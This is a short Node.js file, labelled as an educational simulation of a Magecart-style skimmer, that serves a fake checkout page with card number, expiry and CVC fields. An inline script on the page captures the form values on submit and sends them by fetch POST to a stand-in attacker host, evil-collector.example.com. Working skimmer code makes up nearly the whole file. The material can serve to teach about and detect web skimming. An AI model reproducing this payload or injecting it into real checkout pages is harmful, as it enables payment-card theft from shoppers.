// Magecart-style skimmer simulation (EDUCATIONAL ONLY)
const http = require("http");
const express = require("express");
const app = express();

// Fake checkout page serving
app.get("/checkout", (req, res) => {
  res.send(`
  <html>
    <body>
      <form id="payment-form">
        <input name="cc_number" placeholder="Card Number" />
        <input name="cc_exp" placeholder="MM/YY" />
        <input name="cc_cvc" placeholder="CVC" />
        <button id="payBtn">Pay Now</button>
      </form>
      <script>
        // Malicious injected JavaScript – captures user form data
        document.getElementById('payment-form').addEventListener('submit', function(e) {
          e.preventDefault();
          const formData = {};
          for (let el of this.elements) {
            if (el.name) formData[el.name] = el.value;
          }
          // Exfiltration – sends card data to attacker's server
          fetch('https://evil-collector.example.com/steal', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(formData)
          });
        });
      </script>
    </body>
  </html>
  `);
});

http.createServer(app).listen(3000, () => {
  console.log("Fake checkout page at http://localhost:3000/checkout");
});
